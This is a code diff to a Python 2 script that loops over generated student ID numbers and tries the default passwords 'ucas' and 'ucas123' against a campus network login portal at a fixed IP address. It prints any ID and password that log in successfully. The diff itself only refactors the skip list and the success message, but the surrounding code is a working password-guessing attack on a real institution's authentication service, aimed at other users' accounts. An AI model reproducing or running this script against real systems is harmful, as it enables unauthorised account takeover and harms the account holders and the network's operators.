@@ -7,10 +7,13 @@
 '''
 
 import urllib2,threading,urllib,traceback,re,json
-
+    
+skip_ids = ['2014E8018661141', '2014E8018661142']
 
 def login(num_str,passwd):
-	'Send http post data'
+	'''
+        Send http post data
+    '''
 	header = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0'}
 	login_url = 'http://210.77.16.21/eportal/InterFace.do?method=login'
 	post_data  ={'operatorPwd':'',	
@@ -40,9 +43,9 @@ def generator():
 
 def main():
     default_passwd = ['ucas', 'ucas123']
-    skip_id = ['2014E8018661141', '2014E8018661142']
+    global skip_ids
     for num in generator():
-        if num in skip_id:
+        if num in skip_ids:
             continue
         for passwd in default_passwd:
             #print 'using ID:',num
@@ -50,7 +53,7 @@ def main():
             if res:
                 json_data = json.loads(res)
                 if json_data and json_data.has_key('result') and json_data['result']=='success':
-                    print 'Login with ID: ',num,'\npassword: ',default_passwd,'\nNB !!!!'
+                    print 'Login with ID: ',num,'\npassword: ', passwd,'\nNB !!!!'
                     return
 
 
